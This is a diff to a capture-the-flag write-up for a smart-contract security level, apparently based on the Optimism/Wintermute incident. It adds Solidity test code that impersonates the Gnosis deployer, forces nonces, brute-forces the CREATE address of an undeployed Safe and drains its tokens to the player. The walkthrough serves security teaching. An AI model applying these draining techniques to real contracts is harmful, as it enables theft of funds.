@@ -903,32 +903,88 @@ timelock.execute(targets, values, dataElements, salt);
 
 To beat this level, we need to comply with
 
-* ???
+* Be able to deploy code at the given addresses.
+* Drain the given deposit address and the wallet deployer contract into the player's account.
 
 ```solidity
+// Factory account must have code
+assertTrue(address(walletDeployer.fact()).code.length > 0);
+
+// Master copy account must have code
+assertTrue(address(walletDeployer.copy()).code.length > 0);
+
+// Deposit account must have code
+assertTrue(DEPOSIT_ADDRESS.code.length > 0);
+
+// The deposit address and the Safe Deployer contract must not hold tokens
+assertEq(token.balanceOf(DEPOSIT_ADDRESS), 0);
+assertEq(token.balanceOf(address(walletDeployer)), 0);
+
+// Player must own all tokens
+assertEq(
+  token.balanceOf(playerAddress),
+  initialWalletDeployerTokenBalance + DEPOSIT_TOKEN_AMOUNT);
 ```
-
-### Analysis
-
-* ???
-
-* 0x9B6fb606A9f5789444c17768c6dFCF2f83563801
 
 ### Solution
 
-* ???
-* Must be able to explain the 20M $OP hack first
+The first Task 1 involves draining the funds from the address `0x9B6fb606A9f5789444c17768c6dFCF2f83563801`. The funds were initially transferred to this empty address. It is assumed that this address was intended to be a Gnosis Safe wallet that has not yet been deployed. The Gnosis Safe Factory, which should be located at `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`, is also not deployed.
+
+The initial step in resolving this issue involves examining the address on Etherscan, we find the deployer, which in etherscan is identified as "Safe: Deployer 3". There, in etherscan, there is the raw transaction of the deployment of the factory. Pre EIP-155 we could just replay the transaction in other networks, which is what happened at Optimism with Gnosis Safe.
+
+In this exercise, we will just leverage the found deployer address to deploy the factory and the master copy. The latter is a requirement to solve the level. Notice that we don't need to use the Gnosis Proxy, but we will be using a custom contract to be able to drain the funds.
+
+```solidity
+address gnosisDeployer = 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;
+vm.startPrank(gnosisDeployer);
+```
+
+Now, by analyzing the transaction history of the deployer address on Etherscan, the nonces for each relevant address are identified as follows: the nonce for `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F` is `0`, and for `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`, it is `2`. With the factory now set, the next step involves deploying an attacking wallet.
+
+```solidity
+attacker = new AttackerWallet();
+vm.setNonce(gnosisDeployer, 2);
+factory = new GnosisSafeProxyFactory();
+```
+
+The attacker wallet, just a facilitator for the ERC-20 transfer to be in place.
+
+```solidity
+contract AttackerWallet {
+  function transfer(address token, address to, uint256 amount) external {
+    IERC20(token).transfer(to, amount);
+  }
+}
+```
+
+The deployment of a custom contract as a wallet is made feasible because the `GnosisSafeProxyFactory.sol` function `createProxy()` employs the `CREATE` opcode. This opcode generates a new address using only the keccak256 hash of the sender and nonce values.
+
+As we know the sender, we need to find out the hash by bruteforcing it:
+
+```solidity
+for (uint8 i = 0; i < 100; i++) {
+  wallet = factory.createProxy(address(attacker), "");
+  if ((address(wallet)) == 0x9B6fb606A9f5789444c17768c6dFCF2f83563801) {
+    break;
+  }
+}
+```
+
+With the found nonce, we create the attacking wallet, and perform the actual draining:
+
+```solidity
+vm.setNonce(address(factory), 43);
+wallet = factory.createProxy(address(attacker), "");
+
+// Now that we have control of this address, we can drain its funds.
+AttackerWallet(address(wallet))
+  .transfer(
+    address(level.token()),
+    level.playerAddress(),
+    level.DEPOSIT_TOKEN_AMOUNT());
+```
 
 ### References
 
-
 * https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY
-
-* Explicar como la cosa no tiene esto
-  * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md
-  * A partir de `Spurius Dragon`, Block 2,675,000.
-  * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-607.md
-
-* Considering to add
-  * https://inspexco.medium.com/how-20-million-op-was-stolen-from-the-multisig-wallet-not-yet-owned-by-wintermute-3f6c75db740a
-  * https://techfi.tech/the-exploit-on-optimism-what-if-you-are-too-optimistic/
+* https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md
